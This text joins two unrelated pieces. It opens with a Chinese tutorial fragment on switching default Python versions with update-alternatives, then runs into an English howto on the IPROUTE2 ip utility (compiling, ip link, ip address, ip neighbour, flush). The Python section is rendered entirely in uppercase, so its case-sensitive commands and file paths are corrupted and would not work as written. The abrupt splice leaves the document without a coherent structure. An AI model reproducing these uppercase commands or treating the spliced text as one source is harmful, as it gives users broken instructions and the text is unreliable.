$ LS /USR/BIN/PYTHON*
/USR/BIN/PYTHON  /USR/BIN/PYTHON2  /USR/BIN/PYTHON2.7  /USR/BIN/PYTHON3  /USR/BIN/PYTHON3.4  /USR/BIN/PYTHON3.4M  /USR/BIN/PYTHON3M
然后执行如下命令查看默认的 PYTHON 版本信息:
$ PYTHON --VERSION
PYTHON 2.7.8
# UPDATE-ALTERNATIVES --LIST PYTHON
UPDATE-ALTERNATIVES: ERROR: NO ALTERNATIVES FOR PYTHON
如果出现以上所示的错误信息，则表示 PYTHON 的替代版本尚未被 UPDATE-ALTERNATIVES 命令识别。想解决这个问题，我们需要更新一下替代列表，将 PYTHON2.7 和 PYTHON3.4 放入其中。
# UPDATE-ALTERNATIVES --INSTALL /USR/BIN/PYTHON PYTHON /USR/BIN/PYTHON2.7 1
UPDATE-ALTERNATIVES: USING /USR/BIN/PYTHON2.7 TO PROVIDE /USR/BIN/PYTHON (PYTHON) IN AUTO MODE
# UPDATE-ALTERNATIVES --INSTALL /USR/BIN/PYTHON PYTHON /USR/BIN/PYTHON3.4 2
UPDATE-ALTERNATIVES: USING /USR/BIN/PYTHON3.4 TO PROVIDE /USR/BIN/PYTHON (PYTHON) IN AUTO MODE
- - INSTALL 选项使用了多个参数用于创建符号链接。最后一个参数指定了此选项的优先级，如果我们没有手动来设置替代选项，那么具有最高优先级的选项就会被选中。这个例子中，我们为 /USR/BIN/PYTHON3.4 设置的优先级为2，所以 UPDATE-ALTERNATIVES 命令会自动将它设置为默认 PYTHON 版本。
# PYTHON --VERSION
PYTHON 3.4.2
接下来，我们再次列出可用的 PYTHON 替代版本。
# UPDATE-ALTERNATIVES --LIST PYTHON
/USR/BIN/PYTHON2.7
/USR/BIN/PYTHON3.4
现在开始，我们就可以使用下方的命令随时在列出的 PYTHON 替代版本中任意切换了。
# UPDATE-ALTERNATIVES --CONFIG PYTHON
*** IPROUTE2 Utility Suite Howto
IPROUTE2 Utility Suite Howto
Main PolicyRouting.Org Website          PolicyRouting Book

9.0 Obtaining & Compiling IPROUTE2
9.1 IP Command Set
9.1.1 ip link - network device configuration
9.1.2 ip link set --- change device attributes.
9.2 ip address - protocol address management
9.2.1 ip address add --- add new protocol address.
9.2.2 ip address delete --- delete protocol address.
9.2.3 ip address show --- look at protocol addresses.
9.3 IP Interface Primary and Secondary Addressing:
9.3.1 ip address flush --- flush protocol addresses.
9.4 ip neighbour --- neighbour/arp table management.
9.4.1 ip neighbour add --- add new neighbour entry
9.4.2 ip neighbour change --- change existing entry
9.4.3 ip neighbour replace --- add new or change existing entry
9.4.4 ip neighbour delete --- delete neighbour entry.
9.4.5 ip neighbour show --- list neighbour entries.
9.4.6 ip neighbour flush --- flush neighbour entries.
9.5 ip route - routing table management.
9.5.1 ip route add --- add new route
9.5.2 ip route change --- change route
9.5.3 ip route replace --- change route or add new one.
9.5.4 ip route delete
9.5.5 ip route show
9.5.6 ip route flush - alows group deletion of routes
9.5.7 ip route get - obtain route pathing
9.6 ip rule --- routing policy database management.
9.6.1 ip rule add --- insert new rule
9.6.2 ip rule show - list policy rules
9.7 ip tunnel - ip tunnelling configuration
9.7.1 ip tunnel add - creating tunnels
9.7.2 ip tunnel show - list tunnel attributes
9.8 ip monitor and rtmon --- route state monitoring
9.9 rtacct - route realms and policy propagation
9.10 IP Utility Summary
9.11 IP Usage in Scripting
9.12 IPUP & IPDOWN
9.13 IPNetwork Init Script
9.14 ifcfg script
9.15 arping utility
9.16 Policy Routing - Multiple Route Tables Example
IPROUTE2 Utility Suite Documentation
This docvumentation covers the ip utility from IPROUTE2. This utility is written by Alexey N. Kuznetsov who also wrote the IPv6 and IPv4 routing code for Linux 2.2. This is the utility he uses for manipulating the Linux 2.2-2.6 network interface code.

We will begin by explaining where to obtain the utility collection and how to compile it. After it is compiled we will cover the utilities created and in what location on the system they should reside. This includes all of the utilities in the IPROUTE2 suite.

Then we will begin extensive coverage of the ip command with documentation of usage and examples. This section draws heavily upon Alexey's own documentation of the command with additional discussion and examples. Some of the usages of the command, such as multicast and IPv6 specific usage will be deferred at this point but we will be extending this document with that coverage as time goes on. While this is often what would be found in man pages, no man pages currently exist for the ip command and Alexey's own current documentation is only available in Latex format. With Alexey's permission we have edited and expanded the Latex documentation into the sections found here. If there are errors in these sections they probably belong to Matthew's translation and should be addressed to him first.

To tie together what we have learned about the ip utility we will list a few working examples of the ip utility. These include several longer script examples from Alexey along with some daily usage features of the utility. We then in the Table of Contents list a set of examples from real life that are collected here.

Obtaining & Compiling IPROUTE2

The ip utility is just one of the utilities in the IPROUTE2 utility package from Alexey. The primary FTP site was located in Russia at ftp://ftp.inr.ac.ru/ip-routing/ but is no longer running. The most complete mirror is located at http://www.linuxgrill.com/anonymous/iproute2/ with the newest OSDL source code located within the http://www.linuxgrill.com/anonymous/iproute2/NEW-OSDL/ directory. We will assume that you have obtained the latest package usually called iproute2-current symlinked to the latest dated version. The version we primarily cover here is the 1999-06-30 version of IPROUTE2.

Once the utility has been obtained you need to unpack it into whatever directory you use for compiling source code. The default is to use /usr/src. When you have the package untarred you can enter the directory and just type make. You must have the kernel source code that was used to compile your current running kernel located in /usr/src/linux. You do want to compile a version of your own unless you are using a distribution that includes the utility and you have not remade your kernel. Since one of the best tuning and security functions you can perform on your system is to obtain and compile your own specific kernel you will want to compile this utility also as it is the single most important utility in the IP configuration of your system.

After you have typed make the utility suite will compile. Then we have to install the various parts. There is no install target in the makefile. All of the utilities in this package should be installed into the /sbin directory. This is so that they are available even before your /usr directory is mounted. There is additionally a /etc/iproute2 directory in the package that contains sample definition files. If you do not have a /etc/iproute2/ directory on your system then create one and copy the contents of the package directory to the new directory. If an /etc/iproute2/ directory exists and you do not know what it is being used for then you will want to find out if the files in that directory have some meaning to the system you are running. If not then replacing them with the files in the package directory will not hurt.

In a nutshell we want to perform the following steps:

1.	Compile the utilities by typing make

2.	Check /etc/iproute2/ with ls -l /etc/iproute2

3.	If needed create /etc/iproute2/ with

mkdir /etc/iproute2/

4.	Populate it with cp ./etc/iproute2/* /etc/iproute2/

5.	Change into the ip directory with cd ip

6.	cp ifcfg ip routef routel rtacct rtmon rtpr /sbin

7.	Change into tc directory with cd ../tc

8.	cp tc /sbin

This will compile the utility and copy the configuration files and the executables into the appropriate directories. We should now be able to execute the ip utility from anywhere on the system by typing ip. To test and see if this worked type ip addr and you should get a list of the interfaces and addresses on your system.

IP Command Set

In this section we will present a comprehensive description of the ip utility from Alexey Kuznetsov's IPROUTE2 package. We will start by going through most of the ip command in extreme detail. We will cover the link, addr, route, rule, neigh, tunnel, and monitor parts of the ip command. The multicast sections will be covered in a "to be added later" section on IPv6 and multicasting.

We will first go through all of the command syntax of the ip command. This is due to the situation, current as of February 2000, that there are no man pages for ip and the documentation is only available in Latex format. If you have read the ip-cref.tex document that Alexey has written as included in 1999-06-30 distribution of IPROUTE2 then feel free to just skim through most of this section. Matthew has extended the discussion and examples somewhat but the core is taken from ip-cref.tex. If you have any questions or comments about the examples or statements in this section please direct them to Matthew. Note also that by the time you read this the ip command may have changed for 2.3/2.4. As it changes we will attempt to keep this document current.

IP Global Command Syntax

The generic form of the ip command is

ip [ OPTIONS ] OBJECT [ COMMAND [ ARGUMENTS ]]

OPTIONS:

OPTIONS is a multivalued set of modifiers that affect the general behaviour and output of the ip utility. All options begin with the "-" character and may be used both in long and abbreviated form. Currently the following options are available

-V, -Version --- print the version of the ip utility and exit.

-s, -stats, -statistics --- output more information.

This option may be repeated to increase the verbosity level of the output. As a rule the additional information is device or function statistics or values. In many cases the values output should be considered in the same sense as output from the /proc/ directory where the name of the value is not directly related to the value itself. See later when we run this option with different network device drivers.

-f, -family {inet, inet6, link} --- enforce which protocol family to use.

If this option is not present, the protocol family output to use is guessed from the other command line arguments. If the rest of command line does not provide sufficient information to guess a protocol family, the ip command falls back to a default family of inet in the case of network protocols or to any. Link is a special family identifier meaning that no networking protocol is involved. There are several shortcuts for this option and they are as listed here:

-4 --- shortcut for -family inet.

-6 --- shortcut for -family inet6.

-0 --- shortcut for -family link.

-o, -oneline --- format the output records as single lines by replacing any line feeds with the "\" character.

This option is to provide a convenient method for sending the command output through a pipe. IE: When you want to count the number of output records with wc or you want to to grep through the output. As of 1999-06-30 the IPROUTE2 utility package includes the trivial script rtpr to convert the output back to the original readable form.

-r, -resolve --- use system name resolution to output DNS names

Do not use this option if you are reporting bugs with the ip utility or querying for usage advice. ip itself never uses DNS to resolve names to addresses. This option exists for the administrators convenience only.

OBJECT:

OBJECT is the object type on which you wish to operate on or obtain information about. The object types understood by the current ip utility are link, address, neighbor, route, rule, maddress, mroute, and tunnel.

link --- physical or logical network device.

address --- protocol (IPv4 or IPv6) address on a device.

neighbour --- ARP or NDISC cache entry.

route --- routing table entry.

rule --- rule in routing policy database.

maddress --- multicast address.

mroute --- multicast routing cache entry.

tunnel --- tunnel over IP.

The names of all of the objects may be written in full or abbreviated form. IE: address may be abbreviated as addr or just a. However if you use these commands within scripts you should make it a habit to always use the full specification of the action. Using the abbreviation makes it easy to use on the command line but hard to understand the logic within scripts. Since you may not be the only person who ever has to deal with your scripts then you should strive to make them as complete as possible.

COMMAND:

COMMAND specifies the action to perform on the object. The set of possible actions depends on the object type. Typically it is possible to add, delete, and show (list) the object(s), but some objects will not allow all of these operations and many have additional actions and commands. Note that the command syntax help which is available for all objects prints out the full list of available commands and argument syntax conventions. If no command is given a default command is assumed. The default command is usually show (list) but if the objects of the class cannot be listed then the default is to print out the command syntax help.

ARGUMENTS:

ARGUMENTS is the list of command options specific to the command. The arguments depend on the command and the object. There are two types of arguments that can be issued:

--- flags - which are abbreviated with a single keyword

--- parameters - consisting of a keyword followed by a value

Each command has a default parameter which is used if the arguments are omitted. IE: The dev parameter is the default for the ip link command thus ip link list eth0 is equivalent to ip link list dev eth0. Within all the command descriptions below we distinguish default parameters with the marker (default).

As we mentioned above for the names of objects, all keywords may be abbreviated with the first or first few unique letters. These shortcuts are convenient when ip is used interactively, but they are not recommended for use in scripts and please do not use them when reporting bugs or asking for help. Officially allowed abbreviations are listed along with the first mention of the command.

Error Conditions

The ip command most commonly fails for the following reasons:

*	Wrong command line syntax

This is often due to using an unknown keyword, a wrongly formatted IP address, wrong keyword argument for the command, etc. In this case the ip command exits without performing any actions and prints out an error message containing information about the reason for failure. In some cases it prints out the command syntax help.

*	The arguments did not pass self-consistency verification

*	ip failed to compile a kernel request from the arguments due to insufficient user provided information

*	Kernel returned an error to a syscall. In this case ip prints the error message as it was output from perror(3), prefixed with a comment and the syscall identifier.

*	Kernel returned an error to a RTNETLINK request. In this case ip prints the error message as it was output from perror(3) prefixed with "RTNETLINK answers".

Note that all ip command operations are atomic. This means that if the ip command fails it does not change anything in the system. One harmful exception is the ip link command which may change only part of the device parameters given on the command line. We will mention this again in the section on ip link usage and reccomend that all ip link actions be performed individually. This is actually a preferred use for the ip command in general. If you need to perform many repetitions of the command use a script loop or a script as then any generated error messages can be associated with the appropriate ip command action.

It is difficult to list all possible error messages especially the syntax errors. As a rule their meaning should be clear from the context of the command that was issued. For example if we issue the command ip link sub eth0 with the obvious misspelling of set then we get the error message "Command "sub" is unknown, try "ip link help"" which should prompt us to check our command syntax.

In using the ip command there are several facilities that need to be present in order for the command to perform its functions. The ip command talks to the kernel through the NETLINK interface. This is turned on by the NETLINK options which are enabled in the kernel compile. If the ip command does not work or you get an error message then you may not have the needed functions defined or your kernel is not the one you compiled. The most common mistakes are:

*	NETLINK is not configured in the kernel. The error message is

"Cannot open netlink socket Invalid value"

*	RTNETLINK is not configured in the kernel.

In this case one of the following messages may be printed depending on the actual command issued:

"Cannot talk to rtnetlink Connection refused"

"Cannot send dump request Connection refused"

ip link - network device configuration

A link refers a network device. The ip link object and the corresponding command set allows viewing and manipulating the state of network devices. The commands for the link object are just two, set and show.

ip link set --- change device attributes.

Abbreviations: set, s

Warning

You can request multiple parameter changes with ip link. If you request multiple parameter changes and any ONE change fails then ip aborts immediately after the failure thus the parameter changes previous to the failure have completed and are not backed out on abort. This is the only case where using the ip command can leave your system in an unpredictable state. The solution is to avoid changing multiple parameters with one ip link set call. Use as many individual ip link set commands as necessary to perform the actions you desire.

Arguments:

*	dev NAME (default) --- NAME specifies the network device to operate on

*	up / down --- change the state of the device to UP or to DOWN

*	arp on / arp off --- change NOARP flag status on the device

Note that this operation is not allowed if the device is already in the UP state. Since neither the ip utility nor the kernel check for this condition, you can get very unpredictable results changing the flag while the device is running. It is better to set the device down then issue this command.

*	multicast on / multicast off --- change MULTICAST flag on the device.

*	dynamic on / dynamic off --- change DYNAMIC flag on the device.

*	name NAME --- change name of the device.

Note that this operation is not recommended if the device is running or has some addresses already configured. You can break your systems security and screw up other networking daemons and programs by changing the device name while the device is running or has addressing assigned.

*	txqueuelen NUMBER / txqlen NUMBER --- change transmit queue length of the device

*	mtu NUMBER --- change MTU of the device.

*	address LLADDRESS --- change station address of the interface.

*	broadcast LLADDRESS, brd LLADDRESS or peer LLADDRESS --- change link layer broadcast address or peer address in the case of a POINTOPOINT interface

Note that for most physical network devices (Ethernet, TokenRing, etc) changing the link layer broadcast address will break networking. Do not use this argument if you do not understand what this operation really does.

*	The ip command does not allow changing the PROMISC or ALLMULTI flags as these flags are considered obsolete and should not be changed administratively.

Examples:

ip link set dummy address 000000000001 --- change station address of the interface dummy.

ip link set dummy up --- start the interface dummy.

ip link show --- look at device attributes.

Abbreviations: show, list, lst, sh, ls, l

Arguments:

*	dev NAME (default) --- NAME specifies network device to show.

If this argument is omitted, the command lists all the devices.

*	up --- display only running interfaces.

Output:

kuznet@alisa~:$ ip link ls dummy

2: dummy: <BROADCAST,NOARP> mtu 1500 qdisc noop

link/ether 000000000000 brd ffffffffffff

The number followed by a colon is the interface index or ifindex. This number uniquely identifies the interface. If you look at the output from cat /proc/net/dev you will see that the network devices are listed in the same order as the numbering you see here. After the ifindex is the interface name (eth0, sit0 etc.). The interface name is also unique at any given moment, however interfaces may disappear from the list, such as when the corresponding driver module is unloaded, and another interface with the same name will be created later. Additionally with the ip link set DEVICE name NEWNAME command the system administrator may change the devices name.

The interface name may also have another name or the keyword NONE appended after an "@" sign. This signifies that this device is bound to another device in a master/slave device relationship. Thus packets sent through this device are encapsulated and forwarded on via the master device. If the name is NONE, then the master device is unknown.

After the interface name we see the interface mtu (maximal transfer unit) which determines maximal size of data packet which can be sent as a single packet over this interface.

The qdisc (queuing discipline) shows which queuing algorithm is used on the interface. In particular the keyword noqueue means that this interface does not queue anything and the keyword noop indicates that the interface is in blackhole mode in which all of the packets sent to it are immediately discarded.

The qlen indicates the default transmit queue length of the device measured in packets.

Following all of this inormation is a section within angle brackets. Within the angle brackets is where the interface flags are summarized. The most applicable flags are as follows:

UP --- this device is turned on, ready to accept packets for transmission onto the network and it may receive packets from other nodes on the network.

LOOPBACK --- the interface does not communicate to another hosts. All the packets which are sent through it will be returned back to the sender and nothing but bounced back packets can be received.

BROADCAST --- this device has the facility to send packets to all other hosts sharing the same physical link. Example: Ethernet

POINTOPOINT --- the network has only two ends with two nodes attached. All the packets sent to the link will reach the peer link and all packets received are origined by the peer.

If neither LOOPBACK nor BROADCAST nor POINTOPOINT are set, the interface is assumed to be a NBMA (Non-Broadcast Multi-Access) link. NBMA is the most generic type of device and also the most complicated type of device because a host attached to a NBMA link cannot send information to any other host without additional manually provided configuration information.

MULTICAST --- an advisory flag noting the interface is aware of multicasting. Broadcasting is particular case of multicasting where the multicast group contains all of the nodes on the link as members. Note that software must NOT interpret the absence of this flag as the incapability of the interface to multicast. Any POINTOPOINT and BROADCAST link is multicasting by definition because we have direct access to all the link neighbours and thus to any particular group of them. The use of high bandwidth multicast transfers is not recommended on broadcast-only networks due to the high expenses associated with the transmission, but such use is not strictly prohibited.

PROMISC --- the device listens and feeds to the kernel all of the traffic on the link. This includes every packet on the network that passes our transceiver. Usually this mode exists only on broadcast links and is used by bridges and network monitoring devices.

ALLMULTI --- the device receives all multicast packets wandering on the link. This mode is used by multicast routers.

NOARP --- this flag is different from the other flags. It has no invariant value and its interpretation depends on network protocols involved. As a rule it indicates that the device does not need any address resolution and that the software or hardware knows how to deliver packets without any help from the protocol stacks.

DYNAMIC --- is an advisory flag marking this interface as dynamically created and destroyed.

SLAVE --- this interface is bonded to other interfaces in order to share link capacities.

Other flags do exist and can be seen in within the angle brackets but they are either obsolete (NOTRAILERS), not implemented (DEBUG), or specific to certain devices (MASTER, AUTOMEDIA and PORTSEL). We will not discuss them here. Additionally the values of the PROMISC and ALLMULTI flags as shown by the ifconfig utility and by the ip utility are different. The ip link list command provides the current true device state, whereas ifconfig shows the flag state which was set through ifconfig itself.

The second line of the output from the example contains information about the link layer addresses associated with the device. The first word (ether, sit) defines the interface hardware type which then determines the format and semantics of the addresses and thus logically is part of the address itself. The default format of station and broadcast addresses (or peer addresses for pointopoint links) is a sequence of hexadecimal bytes separated by colons. However some link types may instead have their own natural address formats which are used in the presentation. IE: The addresses of IP tunnels are printed as dotted-quad IP addresses. While NBMA links have no well-defined broadcast or peer address, this field may contain useful information such as the address of a broadcast relay or the address of an ARP server. Multicast addresses are not shown by this command, see ip maddr list output.

When given the option -statistics ip will print the interface statistics as additional information in the listing. Note that you can give this option multiple times with each repetition increasing the verbosity of output.

kuznet@alisa~ $ ip -s link ls eth0

3: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 qdisc cbq qlen 100

link/ether 00a0cc661878 brd ffffffffffff

RX bytes packets errors dropped overrun mcast

2449949362 2786187 0 0 0 0

TX bytes packets errors dropped carrier collsns

178558497 1783945 332 0 332 35172

The RX and TX lines summarize receiver and transmitter statistics. The information output breaks down into:

bytes --- total number of bytes received or transmitted on the interface.

This number wraps when the maximal length of the natural data type on the architecture is exceeded. In order to provide correct long term data from this output these statistics should be continuously monitored. Continuous monitoring of this data requires a user level daemon to sample the output periodically.

packets --- total number of packets received or transmitted on the interface.

errors --- total number of receiver or transmitter errors.

dropped --- total number of packets dropped because of lack of resources.

overrun --- total number of receiver overruns resulting in packet drops. As a rule if the interface is overrun you have a serious problem either within the kernel or your machine is too slow to handle the speed of this interface.

mcast --- total number of received multicast packets. This option is supported only on certain devices.

carrier --- total number of link media failures such as those due to lost carrier.

collsns --- total number of collision events on Ethernet-like media. This number has different interpretations on other link types.

compressed --- total number of compressed packets. It is available only for links using VJ header compression.

When you issue the -statistics option more than once you get additional output depending on the statistics supported by the device itself as in the following example with Ethernet:

kuznet@alisa~ $ ip -s -s link ls eth0

3: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 qdisc cbq qlen 100

link/ether 00a0cc661878 brd ffffffffffff

RX bytes packets errors dropped overrun mcast

2449949362 2786187 0 0 0 0

RX errors length crc frame fifo missed

0 0 0 0 0

TX bytes packets errors dropped carrier collsns

178558497 1783945 332 0 332 35172

TX errors aborted fifo window heartbeat

0 0 0 332

In this case the error names are pure Ethernetisms. Other devices may have non-zero fields in these positions but the headers are generated independantly of the device responses. It is up to the device driver to send more appropriate error messages to the system logging facility such as is done by the TokenRing driver.

ip address - protocol address management

Abbreviations: address, addr, a

Arguments: add, delete, flush, show (list)

The address refers to a protocol (IP or IPv6) address attached to a network device. Each device must have at least one address in order to use the corresponding protocol. It is possible to have several different addresses attached to one device. These addresses are not discriminated within the protocol structure so that the term alias is not quite appropriate for such multiple addresses and we will not refer to this situation in those terms.

The ip addr command allows you to look at the addresses and their properties on an interface. You can add new addresses and delete old ones without regard to any ordering. Later on we will discuss the concept of primary and secondary addresses as applied to Linux.

ip address add --- add new protocol address.

Abbreviations: add, a

Arguments:

dev NAME --- name of the device to which we add the address

local ADDRESS (default) --- address of the interface.

The format of the address depends on the protocol. IPv4 uses dotted quad and IPv6 uses a sequence of hexadecimal halfwords separated by colons. The ADDRESS may be followed by a slash and a decimal number, which encodes network prefix (netmask) length in CIDR notation. If no CIDR netmask notation is specified then the command assumes a host (/32 mask) address is specified.

peer ADDRESS--- address of remote endpoint for pointopoint interfaces. Again, the ADDRESS may be followed by a slash and decimal number, encoding the network prefix length. If a peer address is specified then the local address cannot have a network prefix length as the network prefix is associated with the peer rather than with the local address. In other words, netmasks can only be assigned to peer addresses when specifying both peer and local addresses.

broadcast ADDRESS --- broadcast address on the interface.

The special symbols "+" and "-" can be used instead of specifying the broadcast address. In this case the broadcast address is derived by either setting all of the interface host bits to one (+) or by setting all of the interface host bits to zero (-). In most modern implementations of IPv4 networking you will want to use the (+) setting. See the ipup init script in Chapter 15. Unlike ifconfig, the ip command does not set a broadcast address unless explicitly requested.

label NAME --- Each address may be tagged with a label string.

In order to preserve compatibility with Linux-2.0 net aliases, this string must coincide with the name of the device or must be prefixed with device name followed by a colon. (eth0:duh)

scope SCOPE_VALUE --- scope of the area within which this address is valid.

The available scopes are listed in the file

/etc/iproute2/rt_scopes. The predefined scope values are:

global --- the address is globally valid.

site --- (IPv6 only) address is site local, valid only inside this site.

link --- the address is link local, valid only on this device.

host --- the address is valid only inside this host.

Examples:

ip addr add 127.0.0.1/8 dev lo brd + scope host

--- adds the usual loopback address to loopback device. The device must be enabled before this address will show up.

ip addr add 10.0.0.1/24 brd + dev eth0

--- adds address 10.0.0.1 with prefix length 24 (netmask 255.255.255.0) and standard broadcast to interface eth0

ip address delete --- delete protocol address.

Abbreviations: delete, del, d

Arguments:

The arguments coincide with arguments of ip addr add. The device name is a required argument, the rest are optional. If no arguments are given, the first address listed is deleted.

Examples:

ip addr del 127.0.0.1/8 dev lo

--- deletes the loopback address from loopback device.

Alexey states:

"It would be better not to try to repeat this experiment 8-}"

Delete all IPv4 addresses on interface eth0:

while ip -f inet addr del dev eth0; do

nothing

done

Another method to disable IP on an interface using ip addr flush is discussed later.

ip address show --- look at protocol addresses.

Abbreviations: show, list, lst, sh, ls, l

Arguments:

dev NAME (default) --- name of the device.

scope SCOPE_VAL --- list only addresses with this scope.

to PREFIX --- list only addresses matching this prefix.

label PATTERN --- list only addresses with labels matching the PATTERN.

PATTERN is the usual shell regexp style pattern.

dynamic / permanent --- (IPv6 only) list only addresses installed due to stateless address configuration or list only the permanent (not dynamic) addresses.

tentative --- (IPv6 only) list only addresses, which did not pass duplicate address detection.

deprecated --- (IPv6 only) list only deprecated addresses.

primary / secondary --- list only primary (or secondary) addresses.

Example:

kuznet@alisa~ $ ip addr ls eth0

3: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 qdisc cbq qlen 100

link/ether 00a0cc661878 brd ffffffffffff

inet 193.233.7.90/24 brd 193.233.7.255 scope global eth0

inet6 3ffe2400012a0ccfffe661878/64 scope global dynamic

valid_lft forever preferred_lft 604746sec

inet6 fe802a0ccfffe661878/10 scope link

The first two lines coincide with the output of ip link list as it is only natural to interpret link layer addresses as being addresses of the protocol family AF_PACKET. The list of IPv4 and IPv6 addresses follows accompanied by additional attributes such as scope value, flags, and address label. Address flags are set by the kernel and cannot be changed administratively. Currently the following flags are defined:

secondary --- this address is not used when selecting the default source address for outgoing packets. An IP address becomes secondary if another address within the same prefix (network) already exists. The first address within the prefix is primary and is the tag address for the group of all the secondary addresses. When the primary address is deleted all of the secondaries are purged too. See the examples for the actual functionality of these steps.

dynamic --- the address was created due to stateless autoconfiguration. In this case the output also contains information on the times for which the address remains valid. After the preferred lifetime (preferred_lft) expires the address is moved to the deprecated state and after the valid lifetime (valid_lft) expires the address is finally invalidated.

deprecated --- the address is deprecated. It is still valid but cannot be used by newly created connections. See dynamic above.

tentative --- the address is not used because duplicate address detection is still not complete or has failed.

IP Interface Primary and Secondary Addressing:

To explain the actual relationship between primary and secondary addresses we will run the following experiment.

ip addr add 10.1.1.1/24 dev dummy

ip addr add 10.1.1.2/24 dev dummy

Now look at the output:

ip addr list dummy


3: dummy: <BROADCAST,MULTICAST,NOARP> mtu 1500 qdisc noop

link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff

inet 10.1.1.1/24 scope global dummy

inet 10.1.1.2/24 scope global secondary dummy

Now add in some addresses still in that network but add them as host addresses:

ip addr add 10.1.1.3/32 dev dummy

ip addr add 10.1.1.4/25 dev dummy

And run our list command:

ip addr list dummy


3: dummy: <BROADCAST,MULTICAST,NOARP> mtu 1500 qdisc noop

link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff

inet 10.1.1.1/24 scope global dummy

inet 10.1.1.3/32 scope global dummy

inet 10.1.1.4/25 scope global dummy

inet 10.1.1.2/24 scope global secondary dummy

And finally delete the primary address

ip addr del 10.1.1.1/24 dev dummy

Run the list command:

ip addr list dummmy


3: dummy: <BROADCAST,MULTICAST,NOARP> mtu 1500 qdisc noop

link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff

inet 10.1.1.3/32 scope global dummy

inet 10.1.1.4/25 scope global dummy

Note that the most important part of what we said above about secondary and primary addresses is the prefix (netmask) length. Even though technically you can consider the address 10.1.1.3 to belong within the network prefix 10.1.1.0/24, the actual prefix associated with the address is /32 so this address is treated independantly of the initial primary address. If you are still uncertain about why sit down and calculate out the networks and masks of the example above.

What we are showing here is that unlike the behaviour in the 2.0 series kernels under the horrid eth0:xx style aliasing is that multiple addresses on an interface are not neccesarily related. So if you want to (and we will show an example in the howto section) you can enter in all of your ip addresses without network masks and treat them completely independantly.

ip address flush --- flush protocol addresses.

Abbreviations: flush, f

Arguments:

This commands flushes protocol addresses selected by some criteria. This command has the same arguments as show. The major difference is that this command will not run if no arguments are given. Otherwise you could delete all of your addresses by mistake. This command (and the other flush commands described below) are very dangerous. If you make a mistake the command does not ask or forgive but really will creully purge all of your addresses. Be warned!

With the option -statistics the command becomes verbose and prints out the number of deleted addresses and number of processing rounds made in order to flush the address list. If the -statistics option is given twice then ip addr flush also dumps all of the deleted addresses in the full format as described in the ip addr list section.

Examples:

Delete all the addresses from private network 10.0.0.0/8:

netadm@amber~ # ip -stat -stat addr flush to 10/8

2 dummy inet 10.7.7.7/16 brd 10.7.255.255 scope global dummy

3 eth0 inet 10.10.7.7/16 brd 10.10.255.255 scope global eth0

4 eth1 inet 10.8.7.7/16 brd 10.8.255.255 scope global eth1

***Round 1, deleting 3 addresses***

***Flush is complete after 1 round***



Another instructive example is deleting all IPv4 addresses from all Ethernet interfaces in the system:

netadm@amber~ # ip -4 addr flush label "eth*"

And the last example shows how to flush all the IPv6 addresses acquired by the host from stateless address autoconfiguration after enabling forwarding or disabling autoconfiguration.

netadm@amber~ # ip -6 addr flush dynamic

ip neighbour --- neighbour/arp table management.

Abbreviations: neighbour, neighbor, neigh, n

The neighbour table objects establish bindings between protocol addresses and link layer addresses for hosts sharing the same physical link. Neighbour object entries are organized into tables. The IPv4 neighbour object table is known under another name as the ARP table. These commands allow you to look at the neighbour table bindings and their properties, to add new neighbour table entries, and to delete old ones.

Arguments:

add, change, replace, delete, flush and show (list)

ip neighbour add --- add new neighbour entry

ip neighbour change --- change existing entry

ip neighbour replace --- add new or change existing entry

add, a; change, chg; replace, repl

These commands create new neighbour records or update existing ones.

to ADDRESS (default) --- protocol address of the neighbour. It is either an IPv4 or IPv6 address.

dev NAME --- the interface to which this neighbour is attached

lladdr LLADDRESS --- link layer address of the neighbour. LLADDRESS can be null.

nud NUD_STATE --- state of the neighbour entry. nud is an abbreviation for "Neighbour Unreachability Detection". This state can take one of the following values:



permanent --- the neighbour entry is valid forever and can be removed only administratively.

noarp --- the neighbour entry is valid, no attempts to validate this entry will be made but it can be removed when its lifetime expires.

reachable --- the neighbour entry is valid until reachability timeout expires.

stale --- the neighbour entry is valid, but suspicious. This option to ip neighbour does not change the neighbour state if the entry was valid and the address has not been changed by this command.

Examples:

ip neigh add 10.0.0.3 lladdr 000001 dev eth0 nud perm

--- add permanent ARP entry for neighbour 10.0.0.3 on the device eth0.

ip neigh chg 10.0.0.3 dev eth0 nud reachable

--- change its state to reachable.

ip neighbour delete --- delete neighbour entry.

Abbreviations: delete, del, d.

This command invalidates a neighbour entry.

The arguments are the same as with ip neigh add, only lladdr and nud are ignored.

Example:

ip neigh del 10.0.0.3 dev eth0

--- invalidate ARP entry for neighbour 10.0.0.3 on the device eth0.

Deleted neighbour entry will not disappear from the tables immediately; if it is in use it cannot be deleted until the last client will release it, otherwise it will be destroyed during the next garbage collection.

WARNING!

Attempts to delete or to change manually a noarp entry created by kernel may result in unpredictable behaviour. More specifically the kernel may start trying to resolve this address even on NOARP interfaces or change the address to multicast or broadcast.

ip neighbour show --- list neighbour entries.

Abbreviations: show, list, sh, ls.

This commands displays neighbour tables.

Arguments:

to ADDRESS (default) --- prefix selecting neighbours to list.

dev NAME --- list only neighbours attached to this device.

unused --- list only neighbours, which are not in use now.

nud NUD_STATE --- list only neighbour entries in this state. NUD_STATE takes values listed below after the example or the special value all, which means all the states. This option may occur more than once. If this option is absent, ip lists all the entries except for none and noarp.

Example:

kuznet@alisa~ $ ip neigh ls

dev lo lladdr 000000000000 nud noarp

fe80200cfffe763f85 dev eth0 lladdr 00000c763f85 router nud stale

0.0.0.0 dev lo lladdr 000000000000 nud noarp

193.233.7.254 dev eth0 lladdr 00000c763f85 nud reachable

193.233.7.85 dev eth0 lladdr 00e01e633900 nud stale

kuznet@alisa~ $

The first word of each line is the protocol address of the neighbour followed by the device name. The rest of the line describes the contents of neighbour entry identified by the pair (device, address).

lladdr is link layer address of the neighbour.

nud is the state of ``neighbour unreachability detection for this entry. The full list of the possible nud states with minimal descriptions are:

none --- state of the neighbour is void.

incomplete --- the neighbour is in process of resolution.

reachable --- the neighbour is valid and apparently reachable.

stale --- the neighbour is valid, but probably it is already unreachable, so that kernel will try to check it at the first transmission.

delay --- a packet has been sent to the stale neighbour, kernel waits for confirmation.

probe --- delay timer expired, but no confirmation was received. Kernel has started to probe neighbour with ARP/NDISC messages.

failed --- resolution has failed.

